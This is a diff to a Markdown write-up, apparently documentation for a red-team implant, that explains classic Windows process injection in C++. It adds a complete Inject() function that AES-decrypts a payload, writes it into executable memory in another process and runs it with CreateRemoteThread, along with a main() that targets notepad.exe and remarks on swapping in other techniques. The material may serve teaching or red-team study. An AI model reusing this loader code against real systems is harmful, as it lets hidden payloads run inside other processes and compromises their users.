@@ -125,7 +125,7 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
 ```
 
 #### Process Targeting
-In reference to Stages 1-2 above, the generation of a list of running processes and the opening of a handle to a target process is performed by the following `FindTarget()` function. `FindTarget()` takes a name of a function as an argument, and ultimately seeks to return an integer of the target Process ID (PID), which will subsequently be used for injection.
+In reference to Process Injection Stage 1 above, the generation of a list of running processes and the opening of a handle to a target process is performed by the following `FindTarget()` function. `FindTarget()` takes a name of a function as an argument, and ultimately seeks to return an integer of the target Process ID (PID), which will subsequently be used for injection.
 
 In order to accomplish this, `FindTarget()` instantiates a handle (`hProcSnap`), a `PROCESSENTRY32` size variable (`pe32`), and a Process ID (`pid`). It then defines the handle based on the output of [`CreateToolhelp32Snapshot()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) with the `TH32CS_SNAPPROCESS` argument to include all processes in the system in the snapshot. The `pe32` variable then stores the size of this snapshot for future use.
 
@@ -161,26 +161,56 @@ int FindTarget(const char *procname) {
 }
 ```
 
+Note that Process Injection Stage 2 above, where [`OpenProcess()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) is called to generate handle to the target process, is performed in the `main()` function.
+
+#### Process Injection (Classic)
+In reference to Process Injection Stages 3-5 above, the following function displays a classic process injection technique calling [`VirtualAllocEx()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate executable memory into a target process (`hProc`), [`WriteProcessMemory()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write the payload (`pRemoteCode`) into this newly allocated memory within the process (`hProc`), and [`CreateRemoteThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) to execute the payload (`pRemoteCode`).
+
+When altering the process injection technique utilized by an implant, this function should be swapped out for the updated technique.
+
+```c++
+int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
+
+	LPVOID pRemoteCode = NULL;
+	HANDLE hThread = NULL;
+
+	// Decrypt payload
+	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
+	
+	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
+	
+	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
+	if (hThread != NULL) {
+			WaitForSingleObject(hThread, 500);
+			CloseHandle(hThread);
+			return 0;
+	}
+	return -1;
+}
+```
+
+
 #### Payload Writing & Execution
+In `main()`, the custom process targeting function `FindTarget()` is given a process name (ex. `notepad.exe`) to retrieve the Process ID (PID) of. If successful, the PID used as an argument to `OpenProcess()`, which fulfills Process Injection Stage 2 defined above, a handle to the target process (`hProc`) in generated. The `Inject()` function then takes this handle (`hProc`) and performs the literal injection technique.
 
 ```c++
 int main(void) {
     
 	int pid = 0;
-    HANDLE hProc = NULL;
+    	HANDLE hProc = NULL;
 
 	pid = FindTarget("notepad.exe");
 
 	if (pid) {
-		printf("Notepad.exe PID = %d\n", pid);
-
-		// try to open target process
+	
 		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
 						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
 						FALSE, (DWORD) pid);
 
 		if (hProc != NULL) {
-			Inject2(hProc, payload, payload_len);
+			// This function name below may be substituted for a different injection technique
+			Inject(hProc, payload, payload_len);
 			CloseHandle(hProc);
 		}
 	}
